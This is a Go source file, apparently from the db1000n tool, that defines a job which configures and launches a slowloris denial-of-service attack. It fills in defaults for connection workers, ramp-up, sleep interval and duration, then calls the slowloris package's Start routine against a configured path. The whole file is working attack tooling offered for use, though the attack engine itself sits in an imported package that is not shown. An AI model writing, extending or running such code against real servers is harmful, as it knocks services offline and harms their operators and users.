package jobs

import (
	"context"
	"errors"
	"log"
	"time"

	"github.com/Arriven/db1000n/src/core/slowloris"
	"github.com/Arriven/db1000n/src/utils"
)

func slowLorisJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer utils.PanicHandler()

	var jobConfig *slowloris.Config
	if err := utils.Decode(args, &jobConfig); err != nil {
		return nil, err
	}

	if len(jobConfig.Path) == 0 {
		return nil, errors.New("path is empty")
	}

	if jobConfig.ContentLength == 0 {
		const defaultContentLength = 1000 * 1000
		jobConfig.ContentLength = defaultContentLength
	}

	if jobConfig.DialWorkersCount == 0 {
		jobConfig.DialWorkersCount = 10
	}

	if jobConfig.RampUpInterval == 0 {
		jobConfig.RampUpInterval = time.Second
	}

	if jobConfig.SleepInterval == 0 {
		const defaultSleepInterval = 10 * time.Second
		jobConfig.SleepInterval = defaultSleepInterval
	}

	if jobConfig.Duration == 0 {
		const defaultDuration = 10 * time.Second
		jobConfig.Duration = defaultDuration
	}

	shouldStop := make(chan bool)
	go func() {
		<-ctx.Done()
		close(shouldStop)
	}()

	if debug {
		log.Printf("sending slow loris with params: %v", jobConfig)
	}

	return nil, slowloris.Start(shouldStop, jobConfig)
}
